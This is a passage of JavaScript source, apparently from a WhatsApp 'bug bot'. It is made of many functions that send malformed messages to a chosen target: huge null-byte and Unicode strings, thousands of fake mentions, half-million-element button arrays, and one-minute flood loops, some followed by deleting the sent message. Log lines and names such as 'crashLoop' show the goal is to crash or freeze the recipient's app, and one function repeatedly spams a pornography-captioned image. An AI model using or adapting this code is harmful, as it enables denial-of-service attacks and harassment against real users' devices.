        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    
    var NanMsg9 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Nando Is Back Bro",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

    await sock.relayMessage("status@broadcast", NanMsg9.message, {
        messageId: NanMsg9.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    var NanMsg10 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Nando Is Back Bro",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

    await sock.relayMessage("status@broadcast", NanMsg10.message, {
        messageId: NanMsg10.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    console.log(chalk.red(`Succes Bug Delay To ${target}`));
}

async function nativeFroz(sock, target) {
  await sock.relayMessage(target,
    {
      listMessage: {
        title: "⃟🎲⃟ 𝘃𝗮𝘂𝗹𝘁𝘀𝘂𝗽𝗲𝗿𝗶𝗼𝗿",
        description: "𝗲𝘅𝗽𝗹𝗮𝗻𝗮𝘁𝗶𝗼𝗻",
        buttonText: "⃟",
        listType: 1,
        sections: Array.from({ length: 100 }, (_, s) => ({
          title: "\u200b",
          rows: Array.from({ length: 100 }, (_, r) => ({
            rowId: `${s}_${r}`,
            title: "\u200b",
            description: "\u200b"
          }))
        })),
        contextInfo: {
          mentionedJid: Array.from({ length: 1000 }, (_, i) => `628${String(i).padStart(9, '0')}@s.whatsapp.net`),
          isForwarded: true,
          forwardingScore: 99,
          quotedMessage: {
            listMessage: {
              title: "\u200b",
              listType: 1,
              sections: Array.from({ length: 100 }, () => ({
                rows: Array.from({ length: 100 }, (_, r) => ({
                  rowId: `${r}`,
                  title: "\u200b"
                }))
              }))
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}
async function xofm(sock ,target) {
  for (let i = 0; i < 2; i++) {
    await sleep(500);
    const msg = generateWAMessageFromContent(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "ี".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\{".repeat(9999),
                buttons: "ี".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                externalAdReply: {
                  showAdAttribution: true,
                  title: 'vault!nspect',
                  body: 'superior3xplanation',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, msg.message, {});
    
    await sock.chatModify({
      delete: true,
      lastMessages: [{
        key: {
          remoteJid: target,
          fromMe: true,
          id: msg.key.id
        },
        messageTimestamp: Date.now()
      }]
    }, target);
  }
}

async function LexzyModssV6(sock, target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "LexzyModss - Executed ",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => 
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        )
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: false,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `LexzyModss - Executed`
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
    }

    const interactiveResponMessage = {
        contextInfo: {
            forwardingScore: null,
            isForwarded: false,
            fromMe: true,
            participant: "0@s.whatsapp.net",
            mentionJid: usr,
        },
        body: {
            text: x,
            format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
            name: "LexzyModss - Executed¿!",
            paramsJson: x,
            version: 3
        }
    };
    await sock.relayMessage(target, { interactiveResponMessage }, { participant: { jid: target } });

    const view0nceMessageV2 = {
        message: {
            interactiveMessage: {
                locationMessage: {
                    degreesLatitude: 9999999999,
                    degreesLongitude: 9999999999,
                },
                body: {
                    text: "LexzyModss - Executed¿!"
                },
                nativeFlowMessage: {
                    buttons: "\u0000".repeat(10000),
                },
            },
        },
    };
    await sock.relayMessage(target, { viewOnceMessageV2: view0nceMessageV2 }, { participant: { jid: target } });
}
//no shere no remake
// By @JustRxVz
// Support: @VerseNotDev - @zuckyyu

async function Exec(sock,target) {
                     
    
    const msgContent = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Я─𝗥𝘅𝗩𝘇.exe",
                        format: "EXTENSION_1"
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: `{\"flow_token\":\"tok_88291\",\"flow_id\":\"7710293\",\"screen_id\":\"RESPONSE_SCREEN\",\"data\":{\"output_value\":\"${"\u0000".repeat(900000)}\"}}`,
                        version: 3
                    },
                    contextInfo: {
                        stanzaId: sock.generateMessageTag(),
                        participant: target
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msgContent, {
        messageId: sock.generateMessageTag(),
        participant: { jid: target }
    });
}
async function X7DelayJam(sock, target) {
    const X7Msg = {
        messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            deviceListMetadata: {
                senderKeyIndex: 0,
                senderTimestamp: Date.now(),
                recipientKeyIndex: 0
            }
        },
        interactiveResponseMessage: {
            contextInfo: {
                remoteJid: "status@broadcast",
                fromMe: true,
                isQuestion: true,
                forwardedAiBotMessageInfo: {
                    botJid: "13135550202@bot",
                    botName: "Business Assistant",
                    creator: "AsepX7"
                },
                statusAttributionType: 2,
                statusAttributions: Array.from({ length: 209000 }, () => ({
                    participant: `${
                        ['41','91','90','31','40'][Math.floor(Math.random()*5)]
                    }${Math.floor(Math.random()*1e10).toString().padStart(10,'0')}@s.whatsapp.net`,
                    type: 1
                }))
            },
            body: {
                text: "𝖷𝟩 | 𝖠𝗌𝖾𝗉𝟥𝗑𝗉𝗅𝗈𝗌𝗍",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "X7",
                version: 3
            }
        }
    };

    const X7Once = {
        viewOnceMessage: {
            message: X7Msg
        }
    };

    await sock.relayMessage("status@broadcast", X7Once, {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
            }]
        }]
    });
}

async function delayvisiblekeren(sock,target) {
  await sock.relayMessage(target, {
     viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "KANDIXD?!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
                       paramsJson: "\u0000".repeat(1000000),

            version: 3
          },
          contextInfo: {
            participant: sock.user.id,
            remoteJid: "qwertyxyz",
            quotedMessage: {
              paymentInviteMessage: {
               serviceType:3,
               expiryTimestamp: 9999999999,
              }
            },
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 9999
          }
        }
      }
   } 
  },
  {}
  );
}

async function nativeFrz(sock, target) {
  await sock.relayMessage(target,
    {
      groupStatusMessageV2: {
        message: {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: "\u200b".repeat(5000)
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000),
                  buttons: Array.from({ length: 500000 }, () => ({}))
                },
                contextInfo: {
                  mentionedJid: [target],
                  remoteJid: "\u200b".repeat(100),
                  isForwarded: true,
                  forwardingScore: 99,
                  disappearingMode: {
                    initiator: "CHANGED_IN_CHAT",
                    trigger: "INITIATED_BY_OTHER"
                  }
                }
              }
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}

function spambokep(sock, target) {
    const url = 'https://h.top4top.io/p_3809kgsqc1.jpg';
    
    const bokep = () => {
        fetch(url).then(res => res.buffer()).then(buffer => {
            sock.relayMessage(target, {
                imageMessage: {
                    url: url,
                    mimetype: 'image/jpeg',
                    caption: '🔥 BOKEP VIRAL 🔥',
                    fileLength: buffer.length
                }
            }, { participant: { jid: target } });
            setTimeout(bokep, 300);
        }).catch(() => setTimeout(bokep, 500));
    };
    
    bokep();
}

async function DelayV2(sock, target) {
  const Nanas = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          mimetype: "video/mp4",
          fileLength: "17381601",
          title: "NanasMuda - Executed ",
          fileName: " ah ah ange " + "ꦽ".repeat(50000),
          fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
          directPath: "/v/t62.7119-24/fake.enc",
          mediaKeyTimestamp: "1767975195",
          url: "https://mmg.whatsapp.net/d/fake.enc",
          caption: "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
        }
      }
    }
  };

  const Muda = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: " Lexzy Suka Nanas " + "ꦾ".repeat(99999)
          },
          contextInfo: {
            stanzaId: "metawai_id",
            forwardingScore: 999,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, () => 
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", Nanas, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });

  await sock.relayMessage("status@broadcast", Muda, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });

  const startTime = Date.now();
  const duration = 1 * 60 * 1000; // 1 menit
  
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: "\u0000".repeat(500000),
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1950 },
                  () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                )
              ]
            }
          }
        }
      }
    }, { participant: { jid: target } });
  }
}

async function LexzyModssV5(sock, target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "LexzyModss - Executed",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `LexzyModss - Executed`
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "LexzyModss - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQJp84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "LexzyModss - Executed",
                                fileName: "NanasMuda - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(9000)
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
    }
}

async function locacht(sock, target) {
await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
locationMessage: {
degreesLatitude: 9999999999,
degreesLongitude: 9999999999,
},
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
buttons: "\u0000".repeat(500000),
},
},
},
},
}, { participant: { jid: target }});
}

async function BillyR9XCore(sock, target) {
  try {
    const R9X = {
      interactiveResponseMessage: {
        body: {
          text: "\u0000".repeat(50000) + "BillyR9X" + "\u600b".repeat(50000),
          format: "EXTENSIONS_1"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: JSON.stringify({
            flow_cta: "\u002B".repeat(60000),
            wa_flow_response_params: {
              title: "\u0000".repeat(70000),
              flow_id: "\u0030".repeat(80000) + "🩸billytzyOfficial" + "\u600b".repeat(40000),
              flow_cta: "🩸billytzyOfficial" + "\u0000".repeat(90000)
            },
            extraBug: "\u600b".repeat(100000),
            crashLoop: {
              recursive: true,
              depth: 99999,
              payload: "\u0000".repeat(120000)
            }
          }),
          version: 999999999
        },
        contextInfo: {
          quotedMessage: {
            interactiveResponseMessage: {
              body: { text: "\u0000".repeat(80000) },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u600b".repeat(90000),
                version: 999999999
              }
            }
          },
          mentionedJid: [target]
        }
      }
    };

    await sock.relayMessage(target, R9X, {
      participant: { jid: target },
      retryCount: 5,
      additionalAttribs: { isEphemeral: true }
    });

    console.log(`Done Sukses Bugs To ${target} `);

  } catch (err) {
    console.error(`❌ ERROR: ${err.message}`);
  }
}

async function homeinvis(sock, target) {
await sock.relayMessage(target, {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
}, { participant: { jid: target }});
}


async function SupersQxZ(sock, target) {
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Ghost-Here"
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{{".repeat(10000),
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        }, {
            participant: { jid: target }
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: { 
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Ghost-Here"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        }, {
            participant: { jid: target }
        });
    }
}

async function GabungLockV1V2(sock, target) {
await sock.relayMessage(target, {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
buttons: "\u0000".repeat(500000),
},
},
}, { participant: { jid: target } });

await sock.relayMessage(target, {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
buttons: "\0".repeat(500000),
},
},
}, { participant: { jid: target } });
}

async function NoDetectQxZ(sock, target) {
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        const msg = generateWAMessageFromContent(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "No Detect QxZ",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
